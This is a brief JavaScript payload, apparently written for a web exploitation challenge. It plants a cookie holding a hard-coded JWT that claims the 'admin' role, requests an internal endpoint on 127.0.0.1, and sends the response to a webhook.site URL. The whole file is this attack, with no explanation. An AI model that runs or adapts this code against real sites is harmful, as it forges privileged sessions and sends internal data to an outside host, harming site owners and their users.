const sourceUrl = 'http://127.0.0.1:3314/api/generate';
function setCookie(name, value, daysToExpire) {
    let cookie = `${name}=${encodeURIComponent(value)}`;
  
    if (daysToExpire) {
      const expirationDate = new Date();
      expirationDate.setTime(expirationDate.getTime() + (daysToExpire * 24 * 60 * 60 * 1000));
      cookie += `;expires=${expirationDate.toUTCString()}`;
    }
  
    document.cookie = cookie;
  }
  
const cookieName = 'jwt';
const cookieValue = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpZCI6MSwiYmFsYW5jZSI6MCwiaWF0IjoxNzkxNTA3MjM2fQ.bwN40th3oLyFI8lqppmGai935Moq8BBkbJqVEg56JvY';

setCookie(cookieName,cookieValue, 7)
fetch(sourceUrl)
  .then(response => {
    return response.text();
  })
  .then(data => {
    return fetch(`https://webhook.site/0823641ad2bba20d8806d70ad23f9d3ec2dc5a42?response=${data}`);
  })
